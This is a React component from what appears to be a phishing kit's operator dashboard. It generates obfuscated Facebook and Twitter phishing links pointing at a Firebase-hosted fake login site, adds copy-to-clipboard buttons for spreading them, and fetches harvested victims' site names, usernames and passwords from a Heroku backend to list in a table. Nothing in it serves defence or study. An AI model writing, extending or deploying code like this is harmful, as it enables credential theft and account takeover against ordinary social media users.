import React, { useEffect, useRef, useState } from "react";
import PhishData from "./PhishData";
import Twitter from './../../PhishingSite/Twitter/Twitter';
import Facebook from './../../PhishingSite/Facebook/Facebook';
const HackedDetail = ({ keyValue }) => {
  const [fbLink, setFbLink] = useState("");
  const [twitterLink, setTwitterLink] = useState("");
  const [userKey, setUserKey] = useState("");
  const [phishData, setPhishData] = useState([]);
  const twitterLinkCopy = useRef(null);
  const FBLinkCopy = useRef(null);
  const ref = { current: [FBLinkCopy, twitterLinkCopy] };

  const copyToClipboard = (target, web) => {
    target.current.select();
    document.execCommand("copy");
    alert(`${web} Link Copy Successful`);
    // console.log(target);
  };

  useEffect(() => {
    fetch("https://ancient-garden-81797.herokuapp.com/userList", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ key: keyValue }),
    })
      .then((response) => response.json())
      .then((result) => {
        setUserKey(result);
      });
  }, [keyValue]);

  const handelLink = (id) => {
    const yourID = id;

    const split = yourID.split("");

    const split1 = Math.round(split.length / 2);

    let fakeId = "";
    let facebookLink = "&&query=24798dak+ded&&refer+facebook&&redirect=jkl";
    let twitterLink = "&&query=24798dak+ded&&refer+twitter&&redirect=jkl";

    for (let i = 0; i < split1; i++) {
      const element = split[i];
      fakeId += element;
    }
    // console.log(fakeId);

    for (let i = split1; i < split.length; i++) {
      const element = split[i];
      facebookLink += element;
      twitterLink += element;
    }
    // console.log(twitterLink);

    const facebookTrackId = fakeId + facebookLink;
    const twitterTrackId = fakeId + twitterLink;

    const fbPhishLink = `https://social-9bb0e.web.app/facebook?id=${facebookTrackId}`;
    const twitterPhishLink = `https://social-9bb0e.web.app/twitter?id=${twitterTrackId}`;

    setTwitterLink(twitterPhishLink);
    setFbLink(fbPhishLink);
  };

  useEffect(() => {
    fetch("https://ancient-garden-81797.herokuapp.com/phishedData", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ key: keyValue }),
    })
      .then((response) => response.json())
      .then((data) => {
        setPhishData(data);
      });
  }, [keyValue]);

  return (
    <div className="text-center mt-5">
      <h2>Phish Link List</h2>
      <button
        onClick={() => handelLink(userKey[0].key)}
        className="btn btn-danger mb-3"
      >
        Generate
      </button>{" "}
      <br />
      {fbLink ? (
        <button
          className="btn btn-success"
          onClick={() => copyToClipboard(ref.current[0], "Facebook")}
        >
          <i class="far fa-copy"></i>
        </button>
      ) : (
        ""
      )}
      <p className="my-2">Facebook</p>
      <p className="my-2">
        <a href={fbLink}>
          <span>{fbLink}</span>
        </a>
      </p>
      <textarea className="fbLink" ref={FBLinkCopy} value={fbLink}></textarea>
      {/* Twitter Link View */}
      {twitterLink ? (
        <button
          className="btn btn-success"
          onClick={() => copyToClipboard(ref.current[1], "Twitter")}
        >
          <i class="far fa-copy"></i>
        </button>
      ) : (
        ""
      )}
      <p className="my-2">Twitter</p>
      <p className="my-2">
        <a href={twitterLink}>
          <span>{twitterLink}</span>
        </a>
      </p>
      <textarea
        className="twitter"
        ref={twitterLinkCopy}
        value={twitterLink}
      ></textarea>
      <h3 className="my-3">
        <span>
          My Phish Data : <span className="name">{phishData.length}</span>
        </span>
      </h3>
      <table className="table table-dark table-striped">
        <thead>
          <tr>
            <th>*</th>
            <th>Website</th>
            <th>Name</th>
            <th>Password</th>
          </tr>
        </thead>
        <tbody>
          {phishData.map((phish, index) => (
            <PhishData key={phish._id} index={index} phish={phish}></PhishData>
          ))}
        </tbody>
      </table>
    </div>
  );
};

export default HackedDetail;
